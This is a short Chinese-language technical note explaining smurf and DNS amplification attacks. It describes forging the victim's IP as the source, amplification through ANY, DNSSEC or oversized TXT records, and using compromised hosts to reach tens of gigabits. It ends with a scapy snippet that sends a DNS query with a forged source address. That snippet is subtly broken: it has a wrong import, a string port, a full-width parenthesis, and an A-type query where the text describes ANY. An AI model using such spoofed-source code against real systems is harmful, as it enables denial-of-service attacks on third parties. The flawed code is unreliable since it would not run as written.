DNS放大攻击
=====
smurf攻击是对一个子网的广播地址发起一个伪造IP源的ICMP包，这样这个子网的所有机器都会icmp-reply到这个伪造的IP地址上。造成只需要少量的肉鸡就能引起很大的攻击流量。而DNS放大攻击是伪造一个DNS查询的报文，源地址改成想要攻击的IP。单个查询的包64字节，如果是ANY类型查询(或者DNSSEC记录)，那么回复报文一般会大几十倍。当然，如果攻击者自己制造一个很大的TXT记录，那么可能返回的更大的报文，攻击的强度就会更大。这样2M带宽的肉鸡，能制造的攻击流量就能到几百兆了，几十个G攻击流量很容易制造。


    from scapy import *
    
    a = IP(dst='10.32.8.11',src='10.32.132.85') #10.32.132.85即为伪造的源ip
    b = UDP(dport='53')
    c = DNS(id=1,qr=0,opcode=0,tc=0,rd=1,qdcount=1,ancount=0,nscount=0,arcount=0）
    c.qd=DNSQR(qname='www.qq.com',qtype=1,qclass=1)
    p = a/b/c
    send(p)